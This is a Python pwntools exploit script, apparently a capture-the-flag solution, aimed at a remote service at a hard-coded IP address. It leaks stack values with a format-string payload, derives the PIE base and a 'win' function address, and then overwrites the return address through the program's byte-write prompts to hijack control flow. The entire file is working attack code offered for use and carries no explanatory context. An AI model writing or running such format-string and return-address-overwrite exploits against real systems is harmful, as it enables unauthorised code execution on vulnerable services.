#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
HOST = "52.59.124.14"
PORT = 5030

LEAK_OFFSET_VAL = 0xdc052 
WIN_OFFSET_VAL = 0xdbed0

def exploit():
    try:
        io = remote(HOST, PORT)
        
        # 1. Leak range 70-90
        io.recvuntil(b'Name:\n')
        
        parts_list = []
        for i in range(70, 90):
            parts_list.append(f"%{i}$p")
        payload = "|".join(parts_list)
        
        io.sendline(payload.encode())
        io.recvuntil(b"market:\n")
        leak_line = io.recvline().decode().strip()
        
        parts = leak_line.split('|')
        
        ret_idx = -1
        leak_val = 0
        
        for i, part in enumerate(parts):
            if part == '(nil)' or not part.startswith('0x'): continue
            val = int(part, 16)
            # Check alignment (last 12 bits match 052)
            if (val & 0xfff) == (LEAK_OFFSET_VAL & 0xfff):
                ret_idx = 70 + i
                leak_val = val
                break
        
        if ret_idx == -1:
            print("No matching RET found.")
            return

        pie_base = leak_val - LEAK_OFFSET_VAL
        win_addr = pie_base + WIN_OFFSET_VAL
        
        print(f"Index: {ret_idx}")
        print(f"Leak: {hex(leak_val)}")
        print(f"PIE Base: {hex(pie_base)}")
        print(f"WIN: {hex(win_addr)}")
        
        offset = (ret_idx - 10) * 8 - 160
        slot = offset // 16
        adj = offset % 16
        
        print(f"Writing to offset {offset} (Slot {slot}, Adj {adj})")
        
        io.recvuntil(b'slot index 0..128):\n')
        io.sendline(str(slot).encode())
        
        io.recvuntil(b'adjustment inside the slot (0..15):\n')
        io.sendline(str(adj).encode())
        
        io.recvuntil(b'How many bytes of ink? (max 8):\n')
        io.sendline(b'8')
        
        io.recvuntil(b'Ink (raw bytes):\n')
        io.send(p64(win_addr))
        
        io.interactive()
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    exploit()
